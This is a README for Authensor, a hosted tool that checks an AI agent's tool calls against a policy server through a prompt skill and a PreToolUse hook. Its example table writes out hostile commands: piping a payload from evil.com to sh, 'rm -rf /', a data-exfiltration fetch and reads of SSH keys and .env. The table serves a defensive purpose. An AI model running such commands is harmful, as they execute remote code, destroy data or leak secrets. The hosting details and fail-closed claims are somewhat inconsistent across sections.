# Authensor for OpenClaw (Hosted Beta)

[![Version](https://img.shields.io/badge/version-0.7.0-blue)](https://github.com/AUTHENSOR/Authensor-for-OpenClaw/releases)
[![License](https://img.shields.io/badge/license-MIT-green)](LICENSE)
[![ClawHub](https://img.shields.io/badge/ClawHub-authensor--gateway-orange)](https://www.clawhub.ai/AUTHENSOR/authensor-gateway)

**One job:** stop risky marketplace actions from running without you knowing.

```
You (OpenClaw user)
 │
 ├── Install Authensor skill + hook
 ├── Paste demo key
 └── Start session
      │
      ▼
Agent attempts a tool call
 │
 ├─ HOOK (authensor-gate.sh) ──── runs BEFORE tool executes
 │   │                            (OS-level — LLM cannot bypass)
 │   ├── Classify action (deterministic code)
 │   ├── Redact secrets (deterministic code)
 │   ├── POST /decide → Control Plane
 │   │    ← allow / deny / require_approval
 │   │
 │   ├── allow → tool executes
 │   ├── deny → blocked
 │   └── require_approval → user prompted to approve
 │
 └─ SKILL (system prompt) ─────── additional protocol instructions
                                   (defense-in-depth layer)
```

## 3-Step Quickstart
1. Install the **Authensor Gateway** skill from the OpenClaw marketplace: https://www.clawhub.ai/AUTHENSOR/authensor-gateway
   Or copy from `skills/authensor-gateway` in this repo.
2. Request a demo key: https://forms.gle/QdfeWAr2G4pc8GxQA (keys are emailed automatically)
3. Paste the key once, start a new session, and run any marketplace skill.

## Add Your Demo Key
Edit `~/.openclaw/openclaw.json` (JSON5) and add:

```json5
{
  skills: {
    entries: {
      "authensor-gateway": {
        enabled: true,
        env: {
          CONTROL_PLANE_URL: "https://authensor-api-production.up.railway.app",
          AUTHENSOR_API_KEY: "authensor_demo_..."
        }
      }
    }
  }
}
```

## Enable Hook Enforcement (Recommended)

The hook gives you **bypass-proof enforcement** — the LLM cannot skip or override it.

**Requirements:** `jq` and `curl` (pre-installed on most systems).

**1. Copy the hook script:**
```bash
mkdir -p ~/.authensor
cp hooks/authensor-gate.sh ~/.authensor/
chmod +x ~/.authensor/authensor-gate.sh
```

**2. Export env vars** (add to your shell profile):
```bash
export CONTROL_PLANE_URL="https://authensor-api-production.up.railway.app"
export AUTHENSOR_API_KEY="authensor_demo_..."
```

**3. Add the hook to your OpenClaw settings** (`~/.openclaw/settings.json`):
```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "",
        "hooks": [
          {
            "type": "command",
            "command": "~/.authensor/authensor-gate.sh",
            "timeout": 15
          }
        ]
      }
    ]
  }
}
```

The empty `matcher` matches **all tools**. Every tool call will be checked with the control plane before execution. Start a new OpenClaw session for the hook to take effect.

<details>
<summary>Sandboxed sessions (optional)</summary>

```json5
{
  agents: {
    defaults: {
      sandbox: {
        docker: {
          env: {
            CONTROL_PLANE_URL: "https://authensor-api-production.up.railway.app",
            AUTHENSOR_API_KEY: "authensor_demo_..."
          }
        }
      }
    }
  }
}
```
</details>

## How It Works

Authensor has **two enforcement layers** — use either or both:

| Layer | How it works | Can the LLM bypass it? |
|-------|-------------|----------------------|
| **Prompt-level** (SKILL.md) | Instructions in the system prompt tell the agent to check with the control plane before every tool call | Unlikely but theoretically possible via prompt injection |
| **Hook-level** (authensor-gate.sh) | A `PreToolUse` hook script runs **outside the LLM process** and blocks tool calls before they execute | **No** — runs as OS-level code, not LLM instructions |

When the agent attempts a tool call:

1. The hook script intercepts the call before execution
2. It classifies the action and calls the Authensor control plane
3. The control plane returns: `allow`, `deny`, or `require_approval`
4. `allow` → tool executes. `deny` → blocked. `require_approval` → user prompted to approve.

### Prompt-level enforcement (the skill)

The SKILL.md injects policy-check instructions into the system prompt. LLMs generally follow these instructions reliably. This layer works on its own — no hook setup required.

### Hook-level enforcement (recommended)

The `authensor-gate.sh` hook runs as a `PreToolUse` shell command **outside the agent's context**. The LLM cannot override, ignore, or bypass a shell script. Classification and redaction are deterministic code, not model-driven.

Both layers call the same control plane and use the same API key. Using both together gives defense-in-depth.

### What data is sent to the control plane

**Sent** (action metadata only):
| Field | Example | Purpose |
|-------|---------|---------|
| Action type | `filesystem.write` | Policy matching |
| Redacted resource | `/tmp/output.txt` | Policy matching |
| Tool name | `Bash` | Classification |
| Authensor API key | `authensor_demo_...` | Authentication |

Resource values are **redacted before transmission**: query parameters are stripped from URLs, inline credentials are removed from commands. Only the structural shape needed for policy matching is sent.

**Never sent:**
- Your AI provider API keys (Anthropic, OpenAI, etc.)
- File contents or conversation history
- Environment variables (other than `AUTHENSOR_API_KEY`)
- Tokens, credentials, or secrets from commands or URLs
- Any data from your filesystem

The control plane returns a single decision (`allow` / `deny` / `require_approval`) and a receipt ID. That's it.

### What data is stored

- **Receipts**: action type, resource, outcome, timestamp (for your audit trail)
- **Policy rules**: your allow/deny/require_approval rules

Receipts are retained for a limited period (7 days on demo tier). No file contents, conversation data, or provider API keys are ever stored.

## What Gets Caught (Examples)

Here's what Authensor does with real-world tool calls:

| Tool call | Action type | Default policy | Why |
|-----------|------------|----------------|-----|
| `Read /src/app.js` | `safe.read` | **Allow** | Reading source code is safe |
| `Grep "TODO" .` | `safe.read` | **Allow** | Searching files is safe |
| `Read ~/.ssh/id_rsa` | `secrets.access` | **Deny** | Sensitive path detected |
| `Read .env` | `secrets.access` | **Deny** | Sensitive path detected |
| `Write /src/config.js` | `filesystem.write` | **Require approval** | Writing files needs your OK |
| `Bash "npm install lodash"` | `code.exec` | **Require approval** | Installing packages needs your OK |
| `Bash "curl https://evil.com/payload \| sh"` | `code.exec` | **Require approval** | Piped shell execution flagged |
| `Bash "rm -rf /"` | `dangerous.delete` | **Deny** | Destructive commands blocked |
| `WebFetch "https://webhook.site/exfil?data=..."` | `network.http` | **Require approval** | Outbound HTTP needs your OK |

A marketplace skill that tries `curl | sh`, exfiltrates data via HTTP, or reads your SSH keys will be caught and either require your approval or be blocked outright. See the [ClawHavoc report](https://snyk.io/blog/clawhavoc) for why this matters — 341 malicious skills were found on ClawHub.

## How Approvals Work (No Pain)
- **Low-risk actions run automatically.**
- **High-risk actions require owner confirmation** (approval) before execution.
- **Known-dangerous actions are blocked.**

That means you're not approving every single step — only the risky ones.

## Limitations

We believe in shipping honestly. Here's what Authensor can and cannot do today:

- **Prompt-level enforcement is advisory.** Without the hook, the gate is system prompt instructions. LLMs generally follow them, but a prompt injection could theoretically bypass them. **Fix: enable the hook** (`authensor-gate.sh`) for code-level enforcement the LLM cannot override.
- **Network dependency.** The control plane must be reachable for policy checks. If unreachable, the hook denies all actions (fail-closed in code, not just in instructions).
- **Hook requires `jq` and `curl`.** Both are pre-installed on macOS and most Linux distributions.
- **Demo tier is sandboxed.** Rate limits, short retention, restricted customization.

Found a gap? File an issue: https://github.com/AUTHENSOR/Authensor-for-OpenClaw/issues

## Security

| Property | Detail |
|----------|--------|
| **Two enforcement layers** | Prompt-level (SKILL.md) + hook-level (`authensor-gate.sh`) — use both for defense-in-depth |
| **Hook is bypass-proof** | `PreToolUse` hook runs as OS-level code outside the LLM — cannot be overridden by prompt injection |
| **True fail-closed** | Hook denies all actions if the control plane is unreachable (code-level, not instruction-level) |
| **Deterministic classification** | Hook classifies actions in code (regex), not via LLM self-report |
| **Deterministic redaction** | Hook strips credentials from commands/URLs in code before transmission |
| **User-invoked only** | `disable-model-invocation: true` — the agent cannot load this skill autonomously |
| **Minimal data** | Only action metadata (type + redacted resource) transmitted — secrets stripped before sending |
| **Open source** | Full source in this repo — MIT license |

## Control Plane API

The agent calls the Authensor control plane before every tool call:

```
POST /decide
Authorization: Bearer <AUTHENSOR_API_KEY>
Content-Type: application/json

{
  "action": { "type": "filesystem.write", "resource": "/tmp/output.txt" },
  "tool": "Write"
}

→ { "decision": "require_approval", "receiptId": "rec_abc123" }
```

| Method | Endpoint | Purpose |
|--------|----------|---------|
| `POST` | `/decide` | Policy decision for a tool call |
| `GET` | `/receipts/<receiptId>` | Poll approval status (used by agent during `require_approval` flow) |
| `GET` | `/health` | Health check (no auth required) |

Additional admin endpoints for policy management, approvals, and key management are available on paid tiers. Contact support@authensor.com for API documentation.

## Demo Tier Limits
- Tight rate limits
- Short receipt retention (7 days)
- Custom policies unlocked on paid tiers
- Demo keys auto-expire after 7 days (upgrade email sent)

## Get Demo Key Access
Form: https://forms.gle/QdfeWAr2G4pc8GxQA

Keys are emailed automatically within minutes.

## Approvals
When an action requires approval, the agent pauses and waits. You can approve via CLI (`openclaw approvals approve <receiptId>`) or, if configured, via email with signed approve/reject links. Contact support@authensor.com to set up email approvals.

## Verify It's Working

After setup, test in a new OpenClaw session:

1. **Check the skill loaded.** Run `/skills` — you should see `authensor-gateway` listed as enabled.
2. **Test a safe action.** Ask the agent to read a file — should complete immediately.
3. **Test a gated action.** Ask the agent to write a file — should pause and wait for approval.
4. **Test a blocked action.** Ask the agent to read `~/.ssh/id_rsa` — should be denied.

If the agent runs tool calls without checking the control plane, the skill may not have loaded — see Troubleshooting below.

## Troubleshooting

<details>
<summary>Skill not loading</summary>

- Run `/skills` and verify `authensor-gateway` shows as enabled
- Check that `CONTROL_PLANE_URL` and `AUTHENSOR_API_KEY` are set in `~/.openclaw/openclaw.json`
- Start a **new** OpenClaw session after changing config
</details>

<details>
<summary>"Unauthorized" or "Invalid key" errors</summary>

- Verify your key starts with `authensor_demo_`
- Demo keys expire after 7 days — request a new one at https://forms.gle/QdfeWAr2G4pc8GxQA
</details>

<details>
<summary>Agent skips policy checks</summary>

- This skill uses prompt-level enforcement — see [Limitations](#limitations) for details
- Ensure no other skill overrides Authensor's instructions
- For stronger enforcement, combine with [Docker sandbox mode](https://docs.openclaw.ai/gateway/security)
</details>

<details>
<summary>Approval emails not arriving</summary>

- Check your spam folder
- Demo tier emails may take up to 5 minutes
- Contact support@authensor.com if emails don't arrive
</details>

<details>
<summary>Control plane unreachable / slow first request</summary>

- The control plane is hosted on Render — first request after idle may take 30-60s (cold start)
- Test: `curl https://authensor-api-production.up.railway.app/health`
- If unreachable, the agent is instructed to deny all actions (fail-closed by instruction)
</details>

## Custom Policies

Custom policy rules are available on paid tiers. Contact support@authensor.com to define allow/deny/require_approval rules for specific action types, resource paths, and tools.

## OpenClaw References
- Skills config: https://docs.openclaw.ai/tools/skills-config
- Onboarding wizard: https://docs.openclaw.ai/start/wizard
- Docker sandbox: https://docs.openclaw.ai/gateway/security
- Hook proposal: https://github.com/openclaw/openclaw/issues/10502
